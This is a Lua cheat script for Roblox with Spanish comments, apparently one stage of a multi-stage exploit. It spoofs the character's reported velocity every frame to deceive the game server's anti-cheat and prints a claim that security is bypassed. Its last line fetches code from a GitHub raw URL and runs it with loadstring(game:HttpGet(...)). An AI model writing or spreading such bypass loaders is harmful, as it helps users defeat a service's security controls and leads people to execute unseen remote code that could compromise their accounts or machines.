-- ANILLO 3: SPOOFER DE DATOS
local RunService = game:GetService("RunService")
local LP = game.Players.LocalPlayer

-- Este loop engaña al servidor sobre tu velocidad real
RunService.Heartbeat:Connect(function()
    pcall(function()
        if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            -- Forzamos que la velocidad reportada al server sea SIEMPRE 0 o 16
            LP.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
        end
    end)
end)

print("System: Security fully bypassed. Injecting Core...")
task.wait(2) 

-- CARGA EL ANILLO 4: EL SCRIPT BUENO (EL QUE TIENE EL PODER)
loadstring(game:HttpGet("https://raw.githubusercontent.com/zhubx2867-beep/Proyectos-X/refs/heads/main/X1"))()
